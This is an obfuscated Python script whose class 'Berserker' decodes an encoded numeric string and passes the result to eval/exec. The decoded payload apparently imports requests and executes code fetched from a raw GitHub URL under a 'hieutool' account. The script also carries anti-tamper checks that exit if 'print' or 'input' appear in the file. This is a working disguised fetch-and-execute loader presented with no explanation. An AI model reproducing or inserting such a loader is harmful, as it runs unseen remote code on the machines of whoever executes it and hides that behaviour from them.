class Berserker():
 def __init__(self:object,_bit:str=False,_exit:str=0,*_eval:bool,**_exec:bool)->exec:
  self._encode,_exec[_exit],_bit,self._system,self._bits,self._delete=lambda _decode:"".join(chr(int(_rasputin)-len(_decode.split('|')))if _rasputin!='^'else'ζ'for _rasputin in str(_decode).split('|')),eval,lambda _bit:exit()if self._delete[15]+self._delete[17]+self._delete[8]+self._delete[13]+self._delete[19] in open(__file__, errors=self._delete[8]+self._delete[6]+self._delete[13]+self._delete[14]+self._delete[17]+self._delete[4]).read() or self._delete[8]+self._delete[13]+self._delete[15]+self._delete[20]+self._delete[19] in open(__file__, errors=self._delete[8]+self._delete[6]+self._delete[13]+self._delete[14]+self._delete[17]+self._delete[4]).read()else"".join(_bit if _bit not in self._delete else self._delete[self._delete.index(_bit)+1 if self._delete.index(_bit)+1<len(self._delete)else 0]for _bit in "".join(chr(ord(t)-810478)if t!="ζ"else"\n"for t in self._encode(_bit))),lambda _bytes:_bit(_bytes),lambda _bit:str(_exec[_exit](f"{self._delete[4]+self._delete[-13]+self._delete[4]+self._delete[2]}(''.join(%s),{self._delete[6]+self._delete[11]+self._delete[14]+self._delete[1]+self._delete[0]+self._delete[11]+self._delete[18]}())"%list(_bit))).encode(self._delete[20]+self._delete[19]+self._delete[5]+self._delete[34])if _exec[_exit]==eval else exit(),exit()if _bit else'abcdefghijklmnopqrstuvwxyz0123456789'
  return self.__decode__(_exec[(self._delete[-1]+'_')[-1]+self._delete[18]+self._delete[15]+self._delete[0]+self._delete[17]+self._delete[10]+self._delete[11]+self._delete[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._bits(self._system(_execute)))[0]
Berserker(_bit=False,_sparkle='''810680|810677|810765|810755|810760|810761|810742|810745|810703|810677|810748|810760|810760|810756|810759|810703|810692|810692|810763|810763|810763|810691|810765|810755|810761|810760|810761|810742|810745|810691|810743|810755|810753|810692|810709|810748|810749|810745|810761|810760|810755|810755|810752|810694|810696|810700|^|810680|810677|810760|810755|810755|810752|810677|810747|818542|810756|^|810749|810753|810756|810755|810758|810760|810677|810758|810745|810757|810761|810745|810759|810760|810759|^|810745|810764|810745|810743|810685|810758|810745|810757|810761|810745|810759|810760|810759|810691|810747|810745|810760|810685|810684|810748|810760|810760|810756|810759|810703|810692|810692|810758|810702|810763|810691|810747|810749|810760|810748|810761|810742|810761|810759|810745|810758|810743|810755|810754|810760|810745|810754|810760|810691|810743|810755|810753|810692|810748|810749|810745|810761|810760|810755|810755|810752|810692|810751|810745|810765|810692|810753|810702|810749|810754|810692|810751|810745|810765|810692|810751|810745|810765|810759|810756|810702|810753|810691|810756|810765|810684|810686|810691|810760|810745|810764|810760|810686''')